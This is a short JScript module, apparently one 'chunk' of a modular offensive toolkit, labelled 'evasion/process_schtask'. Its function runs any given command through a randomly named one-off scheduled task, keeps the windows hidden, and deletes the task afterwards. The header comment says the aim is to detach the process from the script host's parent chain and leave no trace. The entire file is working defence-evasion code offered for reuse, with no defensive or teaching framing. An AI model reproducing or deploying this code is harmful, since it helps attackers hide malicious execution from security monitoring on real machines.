// chunk: evasion/process_schtask
// depends: (none)
// provides: create_process
// format: jscript
// note: Creates processes via immediate scheduled task. Process runs under
//       svchost.exe context, completely detached from script host parent chain.
//       Task is auto-cleaned after execution.

function create_process(cmd) {
    try {
        var sh = new ActiveXObject("WScript.Shell");
        var taskName = "t" + Math.floor(Math.random() * 99999);
        sh.Run('schtasks /create /tn "' + taskName + '" /tr "' + cmd + '" /sc once /st 00:00 /f', 0, true);
        sh.Run('schtasks /run /tn "' + taskName + '"', 0, true);
        WScript.Sleep(2000);
        sh.Run('schtasks /delete /tn "' + taskName + '" /f', 0, false);
    } catch(e) {
        var sh2 = new ActiveXObject("WScript.Shell");
        sh2.Run(cmd, 0, false);
    }
}
